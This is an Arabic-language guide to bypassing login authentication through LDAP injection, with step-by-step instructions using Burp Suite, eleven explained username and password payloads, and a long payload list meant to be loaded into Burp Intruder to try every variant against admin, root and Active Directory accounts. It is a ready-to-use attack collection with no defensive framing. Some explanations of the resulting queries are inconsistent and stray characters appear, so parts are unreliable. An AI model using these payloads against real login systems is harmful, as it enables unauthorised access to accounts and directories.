
## الخطوات العملية لتجاوز التحقق من الهوية
#### 1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات والاستجابات.
   - افتح نموذج تسجيل الدخول على الموقع.
#### 2. **إدخال القيم**:
   - أدخل القيم المصممة لتعديل استعلام LDAP في حقل اسم المستخدم (وأحيانًا كلمة المرور).
   - استخدم قيمًا تحتوي على أحرف خاصة مثل `*` (علامة بدل)، `)` (إغلاق شرط)، `|` (أو)، أو `&` (و).
#### 3. **إرسال الطلب**:
   - أرسل النموذج عبر المتصفح أو استخدم أداة مثل **Burp Suite Repeater** لإرسال الطلب يدويًا.
#### 4. **فحص الاستجابة**:
   - إذا نجح تسجيل الدخول (مثل إعادة توجيه إلى لوحة تحكم)، فقد نجح الاستغلال.
   - إذا ظهرت رسالة خطأ مختلفة أو لم يظهر خطأ "بيانات غير صحيحة"، جرب قيمًا أخرى.

---


## جميع المحاولات الممكنة لتجاوز التحقق من الهوية
فيما يلي قائمة شاملة بجميع القيم التي يمكنك تجربتها في حقل **اسم المستخدم** و**كلمة المرور** لمحاولة تجاوز التحقق من الهوية. لكل محاولة، سأشرح كيف تعمل وما هو الاستعلام الناتج. لاحظ أن النجاح يعتمد على كيفية معالجة التطبيق للمدخلات، لذا جرب عدة قيم.

### 1. إدخال علامة البدل لمطابقة أي مستخدم
- **اسم المستخدم**: j `*)(uid=*)`
- **كلمة المرور**: `password` (أو أي قيمة عشوائية)
- **كيف يعمل**:
  - يغلق الشرط الأول `uid=*)` ويضيف شرطًا جديدًا `uid=*` يطابق أي مستخدم.
  - الاستعلام الناتج: `(&(uid=*)(uid=*))(userPassword=password))`
  - هذا يجعل الشرط دائمًا صحيحًا لأي مستخدم، وقد يسمح بتسجيل الدخول كأول مستخدم في الدليل (مثل `admin`).
- **متى ينجح؟**:
  - إذا كان التطبيق لا يتحقق بدقة من كلمة المرور أو يسمح بمطابقة أي مستخدم.

### 2. إدخال شرط دائمًا صحيح
- **اسم المستخدم**:    `*)(uid=*))(|(uid=*`  
- **كلمة المرور**: `password` (أو أي قيمة)
- **كيف يعمل**:
  - يغلق الشرط الأول `uid=*))` ويضيف شرطًا جديدًا باستخدام `|` (أو) ليصبح الاستعلام دائمًا صحيحًا.
  - الاستعلام الناتج: `(&(uid=*)(uid=*))(|(uid=*)(userPassword=password))`
  - الجزء `(|(uid=*)` يعني "أو أي مستخدم"، مما يتجاهل شرط كلمة المرور.
- **متى ينجح؟**:
  - إذا كان التطبيق يسمح باستخدام عمليات منطقية مثل `|` دون تصفية.

### 3. إلغاء شرط كلمة المرور
- **اسم المستخدم**: `admin)(!(&(1=0`  j
- **كلمة المرور**: `q))`  j
- **كيف يعمل**:
  - يحدد اسم مستخدم معين (`admin`) ثم يستخدم `!` (نفي) لإلغاء شرط كلمة المرور.
  - الاستعلام الناتج: `(&(uid=admin)(!(&(1=0)(userPassword=q))))`    
  - الجزء `!(&(1=0)` يعني "نفي شرط خاطئ"، مما يجعل الشرط دائمًا صحيحًا.
- **متى ينجح؟**:
  - إذا كنت تعرف اسم مستخدم معين (مثل `admin`) وكان التطبيق يسمح بعمليات النفي.

### 4. استخدام علامة البدل مع مستخدم محدد
- **اسم المستخدم**: `admin*`  j
- **كلمة المرور**: `password`  
- **كيف يعمل**:
  - يحاول مطابقة أي مستخدم يبدأ بـ `admin` (مثل `admin`, `administrator`).
  - الاستعلام الناتج: `(&(uid=admin*)(userPassword=password))`
  - إذا كان هناك مستخدم يبدأ بـ `admin` وكلمة المرور ضعيفة أو غير مطلوبة، قد ينجح.
- **متى ينجح؟**:
  - إذا كان التطبيق يسمح بعلامات البدل وكان هناك مستخدم مشابه.

### 5. إدخال شرط فارغ
- **اسم المستخدم**: `*`
- **كلمة المرور**: `*`
- **كيف يعمل**:
  - يحاول مطابقة أي مستخدم وأي كلمة مرور.
  - الاستعلام الناتج: `(&(uid=*)(userPassword=*))`
  - قد يسمح بتسجيل الدخول إذا كان التطبيق لا يتحقق من كلمة المرور بدقة.
- **متى ينجح؟**:
  - في التطبيقات ذات الإعدادات السيئة التي تقبل شروطًا عامة.

### 6. إغلاق الاستعلام مبكرًا
- **اسم المستخدم**:  `admin)`  j
- **كلمة المرور**: `anything`
- **كيف يعمل**:
  - يغلق الشرط الأول مبكرًا، مما يتجاهل بقية الاستعلام.
  - الاستعلام الناتج: `(&(uid=admin)(userPassword=anything))`
  - إذا كان التطبيق لا يتحقق من كلمة المرور، قد يسمح بتسجيل الدخول كـ `admin`.
- **متى ينجح؟**:
  - إذا كان التحقق من كلمة المرور ضعيفًا أو معطلاً.

### 7. استخدام عملية OR مع مستخدم محدد
- **اسم المستخدم**: `admin)(|(uid=admin`
- **كلمة المرور**: `password`
- **كيف يعمل**:
  - يضيف شرطًا باستخدام `|` (أو) لمطابقة مستخدم معين.
  - الاستعلام الناتج: `(&(uid=admin)(|(uid=admin)(userPassword=password)))`
  - الجزء `|(uid=admin)` يجعل الشرط صحيحًا إذا كان المستخدم `admin` موجودًا.
- **متى ينجح؟**:
  - إذا كنت تعرف اسم مستخدم صالح وكان التطبيق يسمح بعمليات `|`.

### 8. إدخال شرط فارغ مع إغلاق
- **اسم المستخدم**: `*)`
- **كلمة المرور**: `anything`
- **كيف يعمل**:
  - يغلق الشرط الأول مبكرًا ويجعل الاستعلام يطابق أي مستخدم.
  - الاستعلام الناتج: `(&(uid=*)(userPassword=anything))`
  - قد يسمح بتسجيل الدخول كأي مستخدم إذا كان التحقق ضعيفًا.
- **متى ينجح؟**:
  - في التطبيقات التي لا تتحقق بدقة من المدخلات.

### 9. استخدام خصائص أخرى
- **اسم المستخدم**: `*)(cn=*)`
- **كلمة المرور**: `password`
- **كيف يعمل**:
  - يستخدم خاصية أخرى (مثل `cn` بدلاً من `uid`) لمطابقة أي مستخدم.
  - الاستعلام الناتج: `(&(uid=*)(cn=*))(userPassword=password))`
  - قد ينجح إذا كان التطبيق يستخدم خصائص متعددة (مثل `cn`, `sn`).
- **متى ينجح؟**:
  - إذا كان الخادم يدعم خصائص أخرى غير `uid`.

### 10. محاولة إدخال معقدة
- **اسم المستخدم**:   `admin*)(|(objectClass=*`
- **كلمة المرور**: `anything`
- **كيف يعمل**:
  - يحاول مطابقة أي كائن في الدليل باستخدام `objectClass=*`.
  - الاستعلام الناتج: `(&(uid=admin*)(|(objectClass=*))(userPassword=anything))`
  - الجزء `|(objectClass=*)` يطابق أي كائن، مما قد يتجاهل التحقق.
- **متى ينجح؟**:
  - إذا كان التطبيق يسمح باستخدام خصائص عامة مثل `objectClass`.

---
11 . 
- **اسم المستخدم**: `*)(|(userPassword=`
- **كلمة المرور**: `(*`


# احسن طريقه
### روح حط النص ده في ملف txt واستخدم ال burb suite في ال intruder  علشان تجربلك كل الاحتمالات لل payload

```
*)(uid=*)
password
*)(uid=*))(|(uid=*
admin)(!(&(1=0
admin*
admin)
*)(|(userPassword=
admin*)(|(objectClass=*
*)(cn=*)
*)
admin)(|(uid=admin
*
*)(&
*))%00
)(cn=))\x00
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
root*
root*)((|userpassword=*)
root*)((|userPassword=*)
super*
super*)((|userpassword=*)
super*)((|userPassword=*)
x' or name()='username' or 'x'='y
*)(&
*)(|(password=*
(admin
test)
*))%00
any
admin)(!(&(|
any))
admin))(|(|
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
!
%21
%26
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
%7C
\21
\26
\28
\29
&
(
)
*
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
(*)*)
*)*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
*)(&)
*)|
*))|*
*))%00
*%00
*
%
*)(uid=*))(|(uid=*
*)(objectClass=*))(|(objectClass=*
*)(userPassword=*))(|(userPassword=*
*)(cn=*))(|(cn=*
*)(sn=*))(|(sn=*
*)(mail=*))(|(mail=*
*)(givenName=*))(|(givenName=*
*)(sAMAccountName=*))(|(sAMAccountName=*
*)(|(uid=admin)(uid=*))
*)(|(cn=admin)(cn=*))
*)(|(mail=admin@example.com)(mail=*))
*)(uid=admin)(userPassword=*)
*)(uid=*)(userPassword=admin)
*)(uid=*)(userPassword=123456)
*)(uid=*)(userPassword=*)
*)(uid=admin)(!(userPassword=invalid))
*)(uid=admin))(|(uid=*
*)(uid=admin))(|(userPassword=*
*)(|(uid=*)(userPassword=*))
*)(uid=*)(|(userPassword=admin)(userPassword=*))
*)(uid=*)(userPassword=*))(&(objectClass=person))
*)(uid=*)(userPassword=*))(&(uid=admin))
*)(|(uid=admin)(mail=admin@example.com))
*)(userPassword=*)(uid=admin)
*)(userPassword=admin)(|(uid=*))
*)(cn=admin)(userPassword=*)
*)(uid=admin)(sn=admin)
*)(uid=admin*)(|(userPassword=*))
*)(|(userPassword=*)(cn=admin*))
*)(|(uid=admin*)(cn=*))
*)(|(uid=*)(cn=admin*))
*)(|(uid=*)(cn=root*))
*)(uid=*)(!(uid=guest))
*)(uid=*)(!(uid=anonymous))
*)(uid=*)(!(uid=test))
*)(uid=*)(!(uid=readonly))
*)(uid=*)(description=admin)
*)(uid=*)(description=superuser)
*)(uid=*)(description=root)
*)(uid=*)(|(description=admin)(description=superuser))
*)(uid=*)(|(description=admin)(mail=admin@example.com))
*)(|(uid=admin*)(description=admin))
*)(|(uid=admin*)(mail=admin@example.com))
*)(uid=admin*)(homeDirectory=/home/admin)
*)(uid=admin*)(|(sn=admin)(cn=admin))
*)(uid=admin*)(description=privileged user)
*)(uid=admin*)(physicalDeliveryOfficeName=HQ)
*)(uid=admin*)(homePhone=1234567890)
*)(uid=*)(|(sn=admin)(cn=admin))
*)(uid=*)(|(sn=root)(cn=root))
*)(uid=*)(mail=admin@example.com)
*)(uid=*)(mail=root@example.com)
*)(uid=*)(!(description=guest))
*)(uid=*)(description=manager)
*)(uid=*)(sn=*))(&(cn=admin*))
*)(uid=*)(sn=Smith*)(|(cn=admin*))
*)(uid=*)(!(objectCategory=user))
*)(uid=*)(objectCategory=group)
*)(uid=*)(objectCategory=organizationalUnit)
*)(uid=*)(description=service account)
*)(uid=*)(description=system)
*)(uid=*)(description=IT)
*)(uid=*)(description=HR)
*)(uid=*)(description=Finance)
*)(uid=*)(cn=*))
*)(uid=*)(!(uid=disabled))
*)(uid=*)(!(uid=temp))
*)(uid=*)(accountStatus=active)
*)(uid=*)(!(accountStatus=disabled))
*)(uid=*)(loginShell=/bin/bash)
*)(uid=*)(!(loginShell=/usr/sbin/nologin))
*)(uid=*)(!(loginShell=/bin/false))
*)(uid=*)(host=*)
*)(uid=*)(|(host=localhost)(host=127.0.0.1))
*)(uid=*)(|(host=*)(ipHostNumber=*))
*)(uid=admin)(loginShell=/bin/bash)
*)(uid=admin)(homeDirectory=*)
*)(uid=admin)(loginTime=*)
*)(uid=admin)(accountStatus=active)
*)(uid=admin)(!(accountStatus=disabled))
*)(uid=*)(!(pwdAccountLockedTime=*))
*)(uid=*)(!(pwdChangedTime=*))
*)(uid=*)(!(pwdExpiryTime=*))
*)(uid=*)(!(loginDisabled=TRUE))
*)(uid=*)(!(userAccountControl=514))
*)(uid=*)(userAccountControl=512)
*)(uid=*)(!(msDS-UserAccountDisabled=TRUE))
```
